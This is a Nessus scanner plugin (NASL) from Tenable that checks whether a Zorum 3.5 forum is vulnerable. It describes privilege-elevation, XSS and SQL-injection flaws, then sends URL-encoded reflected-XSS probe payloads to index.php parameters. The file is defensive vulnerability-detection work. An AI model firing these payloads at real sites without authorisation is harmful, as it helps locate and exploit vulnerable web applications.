#
# (C) Tenable Network Security
#
# 

if (description) {
  script_id(17312);
  script_version("$Revision: 1.3 $");

  script_cve_id("CAN-2005-0675", "CAN-2005-0676", "CAN-2005-0677");
  script_bugtraq_id(12777);

  name["english"] = "Multiple Remote Vulnerabilities in Zorum 3.5 and Older";
  script_name(english:name["english"]);
 
  desc["english"] = "
The installed version of Zorum on the remote host is prone to several
remote vulnerabilities in index.php.

  o A Privilege Elevation Vulnerability.
    A attacker can adjust the 'id' parameter after authentication,
    setting it to that of another currently authenticated user to
    gain their privileges.

  o Several Cross-site scripting (XSS) Vulnerabilities.
    The 'list', 'method', and 'frommethod' parameters are not sanitized
    properly, allowing a remote attacker to inject arbitrary script or
    HTML in a user's browser in the context of the affected web site, 
    resulting in theft of authentication data or other such attacks. 

  o A SQL Injection Vulnerability.
    An attacker can insert scripting code in the 'Search in messages 
    created by user' box to trigger an SQL error and possibly 
    manipulate SQL queries if PHP's magic_quotes directives are off.

Solution : Upgrade to a version greater than 3.5 when it becomes
available. 

Risk factor : Medium";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple remote vulnerabilities in Zorum 3.5 and older";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  family["english"] = "CGI abuses";
  script_family(english:family["english"]);

  script_dependencie("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

if (get_kb_item("www/"+port+"/generic_xss")) exit(0);

# Search for Zorum in a couple of different locations in addition to
# cgi_dirs() based on googling for '"Powered by Zorum" "Donate Zorum"'.
dirs = make_list(cgi_dirs());
xtra_dirs = make_array(
  "/forum", 1,
  "/zorum", 1,
  "/zorum_3_5", 1
);
foreach dir (dirs) {
  # Set value to zero if it's already in dirs.
  if (!isnull(xtra_dirs[dir])) xtra_dirs[dir] = 0;
}
foreach dir (keys(xtra_dirs)) {
  # Add it to dirs if the value is still set.
  if (xtra_dirs[dir]) dirs = make_list(dirs, dir);
}


foreach dir (dirs) {
  # Try various XSS exploits.
  # nb: various ways to popup a window with "Nessus was here"
  xss = "%3cscript%3ealert('Nessus%20was%20here')%3c/script%3e";
  exploits = make_list(
    '/index.php?list="/%3e' + xss,
    '/index.php?method="/%3e' + xss,
    '/index.php?method=markread&list=zorumuser&fromlist=secmenu&frommethod="/%3e' + xss
  );
  foreach exploit (exploits) {
    req = http_get(item:string(dir, exploit), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
    if (res == NULL) exit(0);

    # It's a problem if we see "Nessus was here".
    if ("<script>alert('Nessus was here')</script>" >< res) {
      security_warning(port);
      exit(0);
    }
  }
}
